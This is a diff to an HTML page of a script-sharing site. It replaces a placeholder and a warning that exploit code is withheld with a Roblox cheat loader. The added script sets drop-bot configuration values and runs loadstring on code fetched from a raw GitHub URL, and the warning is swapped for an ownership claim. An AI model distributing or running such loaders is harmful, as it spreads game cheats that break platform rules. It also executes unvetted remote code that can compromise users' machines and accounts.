@@ -121,20 +121,19 @@
 
           <!-- IMPORTANT: actual exploit code is intentionally NOT provided here -->
           <pre id="codeBox" class="codebox" aria-label="Script content">
-/* WARNING: Script content omitted on this public page because it enables activity that may violate platform rules.
-   This site provides a safe area to paste and copy **allowed** scripts, notes, and resources.
+getgenv()._ = "Script loaded from my repo | Free to use. Do NOT pay for this."
 
-   If you have legitimate, allowed code you want to share publicly, paste it here.
-   Example placeholder content is below (you may replace locally):
-
-// Example placeholder - allowed content only
--- Script title: Example safe snippet
--- Description: This is a harmless placeholder snippet. Replace locally with permitted content.
-print("Hello from a safe example!") 
+getgenv().Configuration = {
+    OwnerId    = 9435815542,                     -- your main account user id
+    DropAmount = "15000",                        -- amount argument the script uses
+    DropDelay  = 0.5,                            -- delay used inside the drop loop (in seconds)
+    DropPos    = Vector3.new(-264, -13, -378)    -- setup / drop position
+}
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NV0Z/DROPBOT/refs/heads/main/test"))()
           </pre>
 
           <div class="warning" role="alert">
-            ⚠️ The actual exploit script is not posted here. Posting or distributing exploit/cheat tools is not allowed on this site.
+            ⚠️ THIS SCRIPT IS OWNED BY NV0Z DO NOT CLAIM!
           </div>
 
           <div class="controls" role="toolbar" aria-label="Copy controls">
